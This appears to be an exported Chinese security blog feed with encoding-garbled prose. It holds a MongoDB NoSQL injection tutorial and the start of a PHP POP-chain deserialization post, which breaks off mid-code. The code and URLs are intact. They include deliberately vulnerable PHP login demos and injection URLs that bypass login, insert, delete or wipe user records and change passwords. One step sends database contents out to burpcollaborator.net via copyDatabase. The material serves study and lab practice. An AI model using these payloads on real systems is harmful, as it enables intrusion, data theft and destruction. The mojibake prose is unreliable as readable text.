<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.user.find(&#123;&#39;id&#39;:&#123;$gt:1&#125;&#125;) #ä»å½“å‰æ•°æ®åº“çš„é›†åˆuserä¸­æŸ¥æ‰¾idå¤§äº1æ–‡æ¡£</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°æŸ¥è¯¢çš„æ—¶å€™å¸¸å¸¸ä¼šç”¨ä¸€äº›é€»è¾‘æ“ä½œç¬¦ï¼Œè€Œä¸€éƒ¨åˆ†æ³¨å…¥å§¿åŠ¿å°±æ˜¯ç”±æ­¤è€Œæ¥çš„ï¼ˆä¸‹é¢ä¼šè¯´åˆ°ï¼‰</p>
<ul>
<li>gt å¤§äº {â€œfieldâ€: {$gt: value}}</li>
<li>lt å°äº {â€œfieldâ€: {$lt: value}}</li>
<li>gte å¤§äºç­‰äº {â€œfieldâ€: {$gte: value}}</li>
<li>lte å°äºç­‰äº {â€œfieldâ€: {$lte: value}}</li>
<li>ne ä¸ç­‰äº {â€œmember.ageâ€: {$ne: â€œmineâ€}}</li>
<li>exists å­˜åœ¨ä¸å¦ {â€œmemberâ€: {$exists: true}}}</li>
<li>in åŒ…å« {â€œmember.ageâ€: {$in: [null], â€œ$exists: trueâ€}}</li>
<li>exists å­˜åœ¨ä¸å¦ {â€œcouponsCode.0â€: {$exists: 1}} #æ•°ç»„å­˜åœ¨ç¬¬ä¸€æ¡æ•°æ®</li>
<li>or æˆ–è€… {â€œ$orâ€: [{â€œmember.ageâ€: â€œ23â€}, {â€œmember.nameâ€: â€œ23333â€}]}</li>
<li>and å¹¶ä¸” {â€œ$andâ€: [{â€œmember.ageâ€: â€œ23â€}, {â€œmember.nameâ€: â€œ23333â€}]}</li>
<li>regex æ­£åˆ™ ({â€œnameâ€:{â€œ$regexâ€:â€™^a$â€™}})</li>
<li>size ä¸ªæ•° ({â€œnameâ€:{â€œ$sizeâ€:3}})    # $size  nameå…ƒç´ æ•°ä¸º3</li>
</ul>
<h2 id="æ³¨å…¥å§¿åŠ¿"><a href="#æ³¨å…¥å§¿åŠ¿" class="headerlink" title="æ³¨å…¥å§¿åŠ¿"></a>æ³¨å…¥å§¿åŠ¿</h2><p>å¼€å§‹ä¹‹å‰å…ˆå†™ä¸€ç‚¹æµ‹è¯•æ•°æ®è¿›mongodb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und2&quot;,</span><br><span class="line">	password:&quot;cl0und2pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und3&quot;,</span><br><span class="line">	password:&quot;cl0und3pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="å›æ˜¾æ³¨å…¥-æ•°ç»„ç»‘å®šæ³¨å…¥"><a href="#å›æ˜¾æ³¨å…¥-æ•°ç»„ç»‘å®šæ³¨å…¥" class="headerlink" title="å›æ˜¾æ³¨å…¥-æ•°ç»„ç»‘å®šæ³¨å…¥"></a>å›æ˜¾æ³¨å…¥-æ•°ç»„ç»‘å®šæ³¨å…¥</h2><p>å·äº†ä¸€ä¸ªç½‘ä¸Šçš„è„šæœ¬ã€‚å¯ä»¥æŠŠä»–çœ‹åˆ°æˆä¸€ä¸ªç®€å•çš„ç™»é™†éªŒè¯demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="comment">//echo extension_loaded("mongodb") ? "loaded\n" : "not loaded\n";</span></span><br><span class="line">$mongo = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line">$coll = $db-&gt;users; <span class="comment">//é€‰æ‹©é›†åˆ</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="comment">//var_dump($_GET);</span></span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username,</span><br><span class="line">        <span class="string">'password'</span>=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$user[<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$user[<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸url <code>http://192.168.62.151/mongo.php?username=cl0und&amp;password=cl0und1pass</code></p>
<p>ç›¸å½“äºæ‰§è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username:&quot;cl0und&quot;,password:&quot;cl0und1pass&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A1.png" alt="æ•°ç»„ç»‘å®š1.png"></p>
<p><img src="demo1.png" alt="demo1.png"></p>
<p>é‚£ä¹ˆç»“åˆphpå¯ä»¥ä¼ æ•°ç»„çš„ç‰¹æ€§å¯ä»¥</p>
<p>æ³¨å…¥url <code>http://192.168.62.151/mongo.php?username[$ne]=cl0und&amp;password[$ne]=cl0und1pass</code></p>
<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A2.png" alt="æ•°ç»„ç»‘å®š2.png"></p>
<p>ç›¸å½“äºæ‰§è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username:&#123;$ne:&quot;cl0und&quot;&#125;,password:&#123;$ne:&quot;cl0und1pass&quot;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·é€šè¿‡æ•°ç»„çš„åµŒå¥—æˆåŠŸçš„æ”¹å˜äº†ä»£ç æ‰§è¡Œçš„é€»è¾‘ï¼Œä¸‹é¢çš„ä¾‹å­æ¥è‡ªäºä¸€æ¬¡åšé¢˜</p>
<p><img src="demo2.png" alt="demo2.png"></p>
<p>è¿™é‡Œè¦é€šè¿‡å‘˜å·¥çš„å·¥å·æ‰èƒ½æ³¨å†Œï¼Œä½†æ˜¯åœ¨ä¸çŸ¥é“å·¥å·æƒ…å†µä¸‹å¯ä»¥å°è¯•æ³¨å…¥ã€‚æŠ“åŒ…å¯ä»¥å‘ç°æ•°æ®æ˜¯ä»¥jsonæ ¼å¼ä¸Šä¼ çš„ï¼Œä»¥åŠä¹‹å‰æ­¥éª¤çš„ä¸€äº›æç¤ºå¯ä»¥çŒœåˆ°åå°æ•°æ®åº“æ˜¯ä»¥mongodbã€‚å› ä¸º2333è¿™ä¸ªå·¥å·ä¸å­˜åœ¨ï¼Œè€Œjobnumberè¿™ä¸ªç‚¹åˆæœ‰æ³¨å…¥ï¼Œæ‰€ä»¥æˆåŠŸç»•è¿‡æ³¨å†Œé™åˆ¶ã€‚</p>
<p><img src="%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2.png" alt="ç™»é™†ç•Œé¢.png"></p>
<p><img src="json%E4%BC%A0%E5%8F%82.png" alt="jsonä¼ å‚.png"></p>
<h2 id="å›æ˜¾æ³¨å…¥-å­—ç¬¦ä¸²æ‹¼æ¥æ³¨å…¥"><a href="#å›æ˜¾æ³¨å…¥-å­—ç¬¦ä¸²æ‹¼æ¥æ³¨å…¥" class="headerlink" title="å›æ˜¾æ³¨å…¥-å­—ç¬¦ä¸²æ‹¼æ¥æ³¨å…¥"></a>å›æ˜¾æ³¨å…¥-å­—ç¬¦ä¸²æ‹¼æ¥æ³¨å…¥</h2><p>è¿™ç§æ³¨å…¥ç‰¹ç‚¹å’Œä¼ ç»Ÿçš„sqlæ³¨å…¥ç±»ä¼¼ï¼Œå› ä¸ºç¨‹åºå‘˜ç›´æ¥æ‹¼æ¥çš„sqlè¯­å¥ï¼Œé€ æˆä»£ç ä¸æ•°æ®è¾¹ç•Œä¸æ¸…ã€‚å› ä¸ºmongoddbæ˜¯ç”¨jsæ¥æ“ä½œçš„ï¼Œæ‰€ä»¥æ³¨å…¥è¯­å¥ç¬¦åˆjsè¯­æ³•å°±å¥½ã€‚å·è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$query = <span class="string">"var data = db.users.findOne(&#123;username:'$username',password:'$password'&#125;);return data;"</span>;</span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;test;</span><br><span class="line">$data = $db-&gt;execute($query);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'ok'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'retval'</span>]!=<span class="keyword">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $data[<span class="string">'errmsg'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸Šçš„payloadé æ³¨é‡Šæ”¹å˜ä»£ç é€»è¾‘ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨ä¸è¡Œï¼ŒåŸå› å¤§æ¦‚è¯¥æ˜¯é«˜ç‰ˆæœ¬ä¸æ”¯æŒæ³¨é‡Šçš„åŸå› <br><code>http://192.168.62.151/mongo.php?username=cl0und%27});return%20{username:1,password:2};//&amp;password=cl0und1pass1</code></p>
<p>å¯ä»¥æ”¹å˜ç­–ç•¥é—­åˆåé¢çš„ä»£ç <br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:1,password:2});var foo = ({&#39;foo&#39;:&#39;&amp;password=cl0und1pass1</code></p>
<p>ç„¶ååç»­æ­¥éª¤å’Œsqlæ³¨å…¥ç±»ä¼¼</p>
<p><img src="%E5%9B%9E%E6%98%BE.png" alt="å›æ˜¾.png"></p>
<p>æŸ¥çœ‹ç‰ˆæœ¬()<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:version(),password:2});var foo = ({&#39;foo&#39;:&#39;</code></p>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:tojson(db),password:2});var foo = ({&#39;foo&#39;:&#39;</code></p>
<p>æŸ¥çœ‹å½“å‰é›†åˆ<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return {username:tojson(db.getCollectionNames()),password:2};({foo:&#39;1&amp;password=123456</code></p>
<p>æŸ¥çœ‹æ–‡æ¡£<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return {username:tojson(db.users.find()),password:2};({foo:&#39;1&amp;password=123456</code></p>
<p>è¿™é‡Œè²Œä¼¼ä¸€æ¬¡æ€§ä¸èƒ½æŸ¥çœ‹å…¨éƒ¨ï¼Œè¿™æ ·ä¼šå›æ˜¾ä¸€äº›ï¼Œçœ‹èµ·æ¥åƒæ˜¯å†…éƒ¨çš„è„šæœ¬ï¼Œæš‚æ—¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ</p>
<p><img src="%E9%85%8D%E7%BD%AE%EF%BC%9F.png" alt="é…ç½®ï¼Ÿ.png"></p>
<p>éœ€è¦ä¸€æ¡ä¸€æ¡çš„çœ‹</p>
<p><img src="%E4%B8%80%E6%9D%A1%E4%B8%80%E6%9D%A1%E6%9F%A5%E7%9C%8B.png" alt="ä¸€æ¡ä¸€æ¡æŸ¥çœ‹.png"></p>
<p>è”æƒ³åˆ°å¤šæ¡è¯­å¥æ‰§è¡Œï¼Œæ˜¯ä¸æ˜¯å¯ä»¥æ’å…¥æ•°æ®ï¼Ÿ<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.insert({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({&#39;foo&#39;:&#39;</code></p>
<p>é‚£è¿˜èƒ½åˆ é™¤æ•°æ®<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.remove({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({&#39;foo&#39;:&#39;</code></p>
<p>è¿˜èƒ½åˆ åº“è·‘è·¯<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.remove({});var foo = ({&#39;foo&#39;:&#39;</code></p>
<p>æ›´æ–°åˆ«äººå¯†ç <br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.update({&#39;username&#39;:&#39;cl0und&#39;},{$set:{&#39;password&#39;:&#39;hack&#39;}});var foo = ({&#39;foo&#39;:&#39;</code></p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>ä»¥ä¸€ä¸ªä¾‹å­è¯´æ˜ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸ºcc<strong>true</strong>,è¿™é‡Œçš„åŠŸèƒ½æ˜¯æ ¹æ®ä¸Šä¼ çš„ç”¨æˆ·åï¼ŒæŸ¥è¯¢æ‰€ç®¡ç†çš„æœºå™¨ï¼ˆæ²¡æœ‰è¶Šæƒï¼‰</p>
<p>å½“ä¼ ä¸Šå»çš„ç”¨æˆ·åæ­£å¸¸çš„æ—¶å€™</p>
<p>å½“ä¸å­˜åœ¨ç”¨æˆ·åï¼Œæˆ–è€…èº«ä»½éªŒè¯å¤±è´¥çš„æ—¶å€™</p>
<p><img src="bool1.png" alt="bool1.png"></p>
<p><img src="boo2.png" alt="boo2.png"></p>
<p>æµ‹è¯•å‡ºæ³¨å…¥ç‚¹</p>
<p>ç›²æ³¨æ€è·¯æ˜¯ç”¨è¡¨è¾¾å¼çš„ç»“æœä¸ºtrueæ—¶å’Œccç›¸åŠ é‡æ–°å˜æˆç”¨æˆ·åccture</p>
<p><img src="bool3.png" alt="bool3.png"></p>
<p>ç¡®è®¤ç‰ˆæœ¬ä¿¡æ¯</p>
<p>åŒæ ·å¯ä»¥ç”¨äºboolç›²æ³¨è¿˜æœ‰$regixæ“ä½œç¬¦</p>
<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>ç»™ä¸ªdemo<br><code>db.users.find({&#39;$where&#39;:&#39;function() {sleep(5000);}&#39;})</code></p>
<p>åœ¨æ•°ç»„ç»‘å®šçš„ä»£ç ä¸‹å®éªŒè¿™ä¸ªdemo,å‘ç°å› ä¸ºmongodbæˆ–è€…phpé©±åŠ¨çš„é™åˆ¶ï¼Œä¸èƒ½æ­£å¸¸ç”¨<br><code>http://192.168.62.151/mongo.php?username=cl0und&amp;password[$where]=function(){return%20sleep((5000);}</code></p>
<h2 id="å¸¦å¤–æ³¨å…¥"><a href="#å¸¦å¤–æ³¨å…¥" class="headerlink" title="å¸¦å¤–æ³¨å…¥"></a>å¸¦å¤–æ³¨å…¥</h2><p>å®é™…æ²¡æœ‰ç”¨è¿‡ï¼Œä»…ä»…ä½œä¸€ç§æ¢ç´¢</p>
<p>æŸ¥çœ‹ç‰ˆæœ¬<br><code>db.copyDatabase(&#39;cl0und&#39;,&#39;test&#39;,version()+&#39;.wssyoum9pyibk4uaukl9y0okxb31rq.burpcollaborator.net&#39;)</code></p>
<p>å› ä¸ºæŸ¥è¯¢å‡ºæ¥çš„jsonæ ¼å¼æœ‰å’Œurlæ ‡å‡†å†²çªçš„ç‰¹æ®Šå­—ç¬¦æ‰€ä»¥éœ€è¦å‰”é™¤ï¼Œè¿˜æœ‰æ¯ä¸ªæ–‡æ¡£ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ª _id ,zè¿™ä¸ªidä¹Ÿå¾€å¾€ä¸é‚£ä¹ˆé‡è¦æ‰€ä»¥ä¹Ÿå¯ä»¥å‰”é™¤ã€‚åœ¨çœ‹æ–‡æ¡£çš„æƒ³æ‰¾åˆ°mongodbæœ‰å…³base64æˆ–è€…16è¿›åˆ¶çš„å­—ç¬¦ä¸²è½¬æ¢æ–¹æ³•ï¼Œä¸è¿‡å¾ˆå¯æƒœæ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰€ä»¥åšäº†ä¸€ä¸‹çš„æŠ˜ä¸­å¤„ç†ã€‚</p>
<p><img src="ofb.png" alt="ofb.png"><br><code>db.copyDatabase(&#39;cl0und&#39;,&#39;test&#39;,tojson(db.users.findOne({},{_id:0})).replace(new RegExp(&quot;:| |,|\&quot;|{|}&quot;,&quot;gm&quot;),&quot;&quot;)+&#39;.e2hvfklnuw3ciolc2r4s9hd9o0uqif.burpcollaborator.net&#39;)</code></p>
<p><img src="ofb2.png" alt="ofb2.png"></p>
<h2 id="ç•™å‘"><a href="#ç•™å‘" class="headerlink" title="ç•™å‘"></a>ç•™å‘</h2><ul>
<li>å¤šä¸ªmongodbèŠ‚ç‚¹æ•°æ®ä¸ä¸€è‡´æ€§</li>
<li>CSRF</li>
</ul>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>å¯’å‡å¿«ä¹</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB</a></p>
<p><a href="http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/">http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>POPé“¾å­¦ä¹ </title>
    <url>/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸€ä¸ªå¯æ§çš„unserializeç‚¹æ„å‘³ç€ä»€ä¹ˆï¼Ÿ -->
<!-- more -->

<h3 id="æŒ–æ˜æ€è·¯"><a href="#æŒ–æ˜æ€è·¯" class="headerlink" title="æŒ–æ˜æ€è·¯"></a>æŒ–æ˜æ€è·¯</h3><ul>
<li>èƒ½æ§åˆ¶ååºåˆ—åŒ–çš„ç‚¹</li>
<li>ååºåˆ—åŒ–ç±»æœ‰é­”æœ¯æ–¹æ³•</li>
<li>é­”æœ¯æ–¹æ³•é‡Œæœ‰æ•æ„Ÿæ“ä½œï¼ˆå¸¸è§„æ€è·¯ï¼‰</li>
<li>é­”æœ¯æ–¹æ³•é‡Œæ— æ•æ„Ÿæ“ä½œï¼Œä½†æ˜¯é€šè¿‡å±æ€§ï¼ˆå¯¹è±¡ï¼‰è°ƒç”¨äº†ä¸€äº›å‡½æ•°ï¼Œæ°å·§åœ¨å…¶ä»–çš„ç±»ä¸­æœ‰åŒåçš„å‡½æ•°ï¼ˆpopé“¾ï¼‰</li>
</ul>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>æ¥è‡ªçš„<a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html">æŸ æª¬å¸ˆå‚…åšå®¢</a>ï¼Œå»ºè®®å°ä¼™ä¼´ä»¬æ‹¿åˆ°è‡ªå·±å…ˆåšä¸€ä¸‹ï¼Œæ„é€ <a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">popçš„æ–¹æ³•</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="keyword">protected</span> $replacement;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filters;</span><br><span class="line">  <span class="keyword">protected</span> $endl;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="keyword">return</span> $txt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">"E:\\WWW\\test\\ctf"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;<span class="comment">//è¿™é‡Œè£…å…¥LogWriter_Fileå¯¹è±¡</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;<span class="comment">//è¿™é‡Œå·æ¢æ¢æŸ±Songçš„log</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logger;</span><br><span class="line">  <span class="keyword">protected</span> $name;</span><br><span class="line">  <span class="keyword">protected</span> $group;</span><br><span class="line">  <span class="keyword">protected</span> $url;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $group, $url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="keyword">new</span> OutputFilter(<span class="string">"/\[i\](.*)\[\/i\]/i"</span>, <span class="string">"&lt;i&gt;\\1&lt;/i&gt;"</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger(<span class="keyword">new</span> LogWriter_File(<span class="string">"song_views"</span>, <span class="keyword">new</span> LogFileFormat(<span class="keyword">array</span>($fltr), <span class="string">"\n"</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;a href='"</span> . <span class="keyword">$this</span>-&gt;url . <span class="string">"'&gt;&lt;i&gt;"</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"&lt;/i&gt;&lt;/a&gt; by "</span> . <span class="keyword">$this</span>-&gt;group;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="keyword">protected</span> $song;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;&lt;a href='song.php?name="</span> . urlencode(<span class="keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="string">"'&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;get_name() . <span class="string">"&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span><span class="params">($name)</span> 